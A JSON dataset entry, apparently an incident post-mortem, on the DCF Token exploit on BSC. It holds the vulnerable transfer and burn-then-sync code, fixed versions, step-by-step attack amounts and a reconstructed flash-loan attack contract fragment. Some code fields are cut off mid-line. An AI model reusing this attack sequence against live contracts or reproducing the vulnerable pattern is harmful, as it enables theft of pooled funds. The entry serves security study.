@@ -1,0 +1,44 @@
+{
+ "id": "2024__2024-11-24_DCFToken_SlippageProtection_BSC",
+ "source_file": "2024/2024-11-24_DCFToken_SlippageProtection_BSC.md",
+ "title": "DCF Token — Missing Slippage Protection & Transfer Logic Vulnerability Analysis",
+ "date": "2024-11-24",
+ "protocol": "DCF Token",
+ "chain": "BSC",
+ "loss_raw": "$442,028.61 BUSD",
+ "loss_usd": 442028.61,
+ "root_cause": "Missing slippage protection + forced token burn inside LP pair during transfer, enabling unlimited price manipulation",
+ "attack_tx": "0xb375...6fd",
+ "vulnerable_contract": "0xa7e9...1adb (DCF Token)",
+ "classes": [
+  "slippage-amm"
+ ],
+ "code_before": [
+  "// ❌ Vulnerable code — DCF Token contract _transfer function (executed on sell)\nfunction _transfer(\n    address from,\n    address to,\n    uint256 amount\n) internal override {\n    require(\n        !blackAddress[from] || !blackAddress[to],\n        \"black address not transfer\"\n    );\n\n    if (amount == 0 || whiteAddress[from] || whiteAddress[to]) {\n        super._transfer(from, to, amount);\n        return;\n    }\n\n    // Block buys (transfers from pairAddress → user are forbidden)\n    if (from == pairAddress) {\n        require(false, \"buy error\");\n    }\n\n    // Detect sell: fee + burn triggered when transferring to pairAddress\n    if (to == pairAddress && !swapping) {\n        swapping = true;\n        uint256 fee = (amount * 5) / 100;\n        uint256 deadAmount = (amount - fee) / deadCfg; // ❌ deadCfg = 2: half of remaining amount\n\n        amount -= fee;\n        super._transfer(from, address(this), fee);\n\n        uint256 initialUsdtBalance = IERC20(USDT).balanceOf(helperAddress);\n        swapTokensForUSDT(fee, helperAddress);  // fee → USDT swap\n        uint256 newUsdtBalance = IERC20(USDT).balanceOf(helperAddress) - initialUsdtBalance;\n\n        // ❌ No slippage protection in addLiquidity (amountMin = 0)\n        liquidityHelper.addLiquidity(newUsdtBalance);\n        swapping = false;\n\n        // ❌ Core issue: directly burn DCF from pair address + call sync()\n        //    Burn amount = deadAmount itself, not (pair's current DCF balance - deadAmount)\n        //    Attacker can repeatedly trigger this burn with a small transfer\n        if (balanceOf(pairAddress) > deadAmount) {\n            burnPair(deadAmount);\n        }\n    }\n\n    super._transfer(from, to, amount);\n}\n\n// ❌ Vulnerable burnPair — burns tokens from pair and immediately forces sync\nfunction burnPair(uint256 _deadAmount) private {\n    if (_deadAmount > 0) {\n        _burn(pairAddress, _deadAmount);  // ❌ Forcibly reduces pair's balanceOf\n    }\n    IUniswapV2Pair(pairAddress).sync();   // ❌ Updates reserve with reduced balance → price spikes\n}",
+  "// ❌ Vulnerable LiquidityHelper.addLiquidity\nfunction addLiquidity(uint256 _usdtAmount) external onlyOwner {\n    uint256 half = _usdtAmount / 2;\n    uint256 otherHalf = _usdtAmount - half;\n\n    // USDT → DCT swap: amountsOutMin = 0 ❌\n    uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        half,\n        0,          // ❌ minAmountOut = 0: no minimum output validation\n        path,\n        address(this),\n        block.timestamp\n    );\n\n    // USDT + DCT liquidity addition: amountMin = 0, 0 ❌\n    uniswapV2Router.addLiquidity(\n        USDT,\n        DCT,\n        otherHalf,\n        newDctBalance,\n        0,          // ❌ amountAMin = 0: no minimum token A amount validation\n        0,          // ❌ amountBMin = 0: no minimum token B amount validation\n        liquidityReceiveAddress,\n        block.timestamp\n    );\n}"
+ ],
+ "code_after": [
+  "// ✅ Fixed _transfer — LP burn logic removed and slippage protection added\nfunction _transfer(\n    address from,\n    address to,\n    uint256 amount\n) internal override {\n    require(\n        !blackAddress[from] || !blackAddress[to],\n        \"black address not transfer\"\n    );\n\n    if (amount == 0 || whiteAddress[from] || whiteAddress[to]) {\n        super._transfer(from, to, amount);\n        return;\n    }\n\n    if (from == pairAddress) {\n        require(false, \"buy error\");\n    }\n\n    if (to == pairAddress && !swapping) {\n        swapping = true;\n        uint256 fee = (amount * 5) / 100;\n        amount -= fee;\n        super._transfer(from, address(this), fee);\n\n        uint256 initialUsdtBalance = IERC20(USDT).balanceOf(helperAddress);\n        swapTokensForUSDT(fee, helperAddress);\n        uint256 newUsdtBalance = IERC20(USDT).balanceOf(helperAddress) - initialUsdtBalance;\n\n        // ✅ Pass slippage parameter to addLiquidity (allow max 2% price impact)\n        liquidityHelper.addLiquidity(newUsdtBalance, maxSlippageBps);\n        swapping = false;\n\n        // ✅ LP pair direct burn logic completely removed\n        //    If token burning is required, burn to address(0xdead) without calling sync directly\n    }\n\n    super._transfer(from, to, amount);\n}\n\n// ✅ Fixed LiquidityHelper.addLiquidity\nfunction addLiquidity(uint256 _usdtAmount, uint256 _maxSlippageBps) external onlyOwner {\n    uint256 half = _usdtAmount / 2;\n    uint256 otherHalf = _usdtAmount - half;\n\n    // ✅ Calculate expected output amount\n    uint256 expectedDct = getAmountOut(half, USDT, DCT);\n    uint256 minDct = (expectedDct * (10000 - _maxSlippageBps)) / 10000; // ✅ Apply slippage limit\n\n    uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        half,\n        minDct,     // ✅ Set minimum output amount\n        path,\n        address(this),\n        block.timestamp\n    );\n\n    uint256 newDctBalance = ERC20(DCT).balanceOf(address(this)) - initialBalance;\n    uint256 minUSDT = (otherHalf ",
+  "// ✅ Completely remove burnPair call from _transfer\n// If burning is needed, use a transfer to address(0xdead)\n// → Does not change the pair's actual balance, so reserve manipulation is impossible\n\n// Before fix (vulnerable):\nif (balanceOf(pairAddress) > deadAmount) {\n    burnPair(deadAmount);\n}\n\n// After fix (safe):\n// Delete this entire block\n// If a deflationary mechanism is required:\n// super._transfer(from, address(0xdead), burnAmount); // transfer directly to burn address"
+ ],
+ "steps": [
+  "- Attacker (EOA: `0x00c5...60ff`) pre-acquires some DCF tokens (`from: 0x00c5...` → transfers 83.74 DCF to the attack contract)",
+  "→ Calls attack contract (0x77aB...7589): attack(DCF_contract)",
+  "80,435,691 BUSD → 4,039.27 DCF purchased",
+  "29,919,669 BUSD → 1,062,693.42 DCT purchased",
+  "Attacker → transfers 83.74 DCF (small amount) to BUSD-DCF pair",
+  "① Collect 5% fee → swap to USDT",
+  "② addLiquidity(newUSDT) → add liquidity to USDT-DCT pool",
+  "- Burn ~2,037 DCF from BUSD-DCF pair (half burned)",
+  "- Call sync() → recalculate pair reserves",
+  "DCF price: 171 → 2,307,042,000 BUSD/DCF (×13,453,585 increase)",
+  "4,039.27 DCF → transferred to BUSD-DCF pair (re-triggers transfer)",
+  "→ Additional burn triggered then sync",
+  "→ 72,612,978.99 BUSD withdrawn",
+  "1,062,693.42 DCT → 38,302,987.02 BUSD withdrawn"
+ ],
+ "other_code": [
+  "┌─────────────────────────────────────────────────────────────────────┐\n│  Attacker EOA (0x00c5...60ff)                                        │\n│  → Calls attack contract (0x77aB...7589): attack(DCF_contract)       │\n└──────────────────────────┬──────────────────────────────────────────┘\n                           │\n                           ▼\n┌─────────────────────────────────────────────────────────────────────┐\n│  [Step 1] Flash Loan — Recursive calls across 15 PancakeSwap V3 pools│\n│  Borrow: 221,271,336 BUSD (nested execution via flash loan callbacks) │\n└──────────────────────────┬──────────────────────────────────────────┘\n                           │ Receive 221M BUSD\n                           ▼\n┌─────────────────────────────────────────────────────────────────────┐\n│  [Step 2] B",
+  "// Attack contract core logic (reconstructed)\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\n// Entry point: executed inside flash loan callback\nfunction _flashLoanCallback(uint256 borrowedBusd) internal {\n    // [Step 2] Buy DCF with BUSD (to attacker's temporary address)\n    BUSD.transfer(BUSD_DCF_PAIR, 80_435_691e18);\n    BUSD_DCF_PAIR.swap(4039e18, 0, tempAddress, \"\");\n    // Retrieve DCF from temp address back to attack contract\n    tempAddress.transferDCFBack();\n\n    // [Step 3] Buy DCT with BUSD\n    BUSD.transfer(BUSD_DCT_PAIR, 29_919_669e18);\n    BUSD_DCT_PAIR.swap(0, 1_062_693e18, address(this), \"\");\n\n    // [Step 4] Core: trigger price manipulation with small DCF transfer\n    // DCF._transfer internally executes burnPair + sync\n    DCF.transfer(BUSD_DCF_PAIR, 83.74e18)"
+ ]
+}
